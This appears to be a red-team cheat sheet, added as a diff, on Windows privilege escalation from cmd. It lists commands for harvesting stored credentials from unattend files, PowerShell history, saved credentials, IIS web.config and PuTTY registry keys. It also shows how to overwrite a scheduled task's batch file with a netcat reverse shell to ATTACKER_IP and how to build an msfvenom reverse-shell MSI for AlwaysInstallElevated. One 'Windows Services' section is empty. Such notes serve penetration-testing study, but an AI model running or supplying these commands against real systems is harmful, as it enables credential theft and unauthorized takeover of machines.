@@ -1,0 +1,86 @@
+Windows Privilege Escalation techniques using CMD for Red Team Operations
+
+Unattended Windows Installations:
+  C:\Unattend.xml                             Administrators may use Windows Deployment Services, which allows for a single operating 
+  C:\Windows\Panther\Unattend.xml             system image to be deployed to several hosts through the network. These kinds of
+  C:\Windows\Panther\Unattend\Unattend.xml    installations are referred to as unattended installations as they don't require user 
+  C:\Windows\system32\sysprep.inf             interaction. Such installations require the use of an administrator account to perform 
+  C:\Windows\system32\sysprep\sysprep.xml     the initial setup, which might end up being stored in the machine in these locations.
+                                              As part of these files, you might encounter credentials.
+
+Powershell History:
+  type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
+                                              If a user runs a command that includes a password directly as part of the Powershell command 
+                                              line, it can later be retrieved by using the following command from a `cmd.exe` prompt
+                                              Note: The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%`
+                                              as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`
+
+Saved Windows Credentials:
+  cmdkey /list                                Windows allows us to use other users' credentials. This function also gives the option to save
+                                              these credentials on the system. The command below herein list saved credentials
+  runas /savecred /user:admin cmd.exe         While you can't see the actual passwords, if you notice any credentials worth trying, you 
+                                              can use them with the `runas` command and the `/savecred` option, as seen herein
+
+IIS Configuration:
+  C:\inetpub\wwwroot\web.config               Internet Information Services (IIS) is the default web server on Windows installations
+  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config   The configuration of websites on IIS is stored in a file called `web.config` and can store
+                                              passwords for databases or configured authentication mechanisms. Depending on the installed
+                                              version of IIS, we can find `web.config` in one of the following locations
+  type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+                                              Quick way to find database connection strings on the file
+
+Retrieve Credentials from Software PuTTY:
+  reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s  
+                                              To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with this command.
+                                              The stored proxy username should also be visible after running the command above. Just as putty stores credentials, any software that
+                                              stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover 
+                                              any passwords the user has saved.
+
+Scheduled Tasks:
+  schtasks                                   List scheduled tasks 
+  schtasks /query /tn vulntask /fo list /v   Retrieve detailed information about any of the services, what matters from output is the "Task to Run" parameter which
+                                             indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be
+                                             used to execute the task.
+  icacls c:\tasks\schtask.bat                Check the file permissions on the executable. If our current user can modify or overwrite the "Task to Run" executable,
+                                             we can control what gets executed by the "taskusr1" user, resulting in a simple privilege escalation. 
+  echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+                                             Change the bat file to spawn a reverse shell. If i.e. the `BUILTIN\Users` group has full access `(F)` over the task's
+                                             binary. This means we can modify the `.bat` file and insert any payload we like
+  nc -lvp 4444                               Start a listener on the attacker machine on the same port we indicated on our reverse shell
+  schtasks /run /tn vulntask                 We would run the task with this command. The next time the scheduled task runs, you should receive the reverse shell with
+                                             `taskusr1` privileges. You probably are not be able to start the task in a real scenario and have to wait for the scheduled task to trigger
+
+AlwaysInstallElevated:
+  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer   Query registry value keys from the command line. Windows installer files (also known as .msi files) are used to install applications on the system.
+  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer   They usually run with the privilege level of the user that starts it. However, these can be configured 
+                                                                 to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us 
+                                                                 to generate a malicious MSI file that would run with admin privileges. 
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.224.237 LPORT=LOCAL_PORT -f msi -o malicious.msi
+                                                                 To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. 
+                                                                 If these are set, you can generate a malicious `.msi` file using `msfvenom`.
+  msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi            As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. 
+                                                                 Once you have transferred the file you have created, you can run the installer this command and receive the reverse shell
+
+Windows Services:                                          
+
+
+
+
+
+
+
+
+Informational:
+  Any user with administrative privileges will be part of the Administrators group. Standard users are part of the Users group.
+Special built-in accounts used by the operating system in the context of privilege escalation. These accounts are created and
+managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their
+privileges due to exploiting specific services:
+	SYSTEM / LocalSystem   An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
+	Local Service          Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
+	Network Service        Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.
+
+Depending on the situation, we might need to abuse some of the following weaknesses:
+	 Misconfigurations on Windows services or scheduled tasks
+	 Excessive privileges assigned to our account
+	 Vulnerable software
+	 Missing Windows security patches
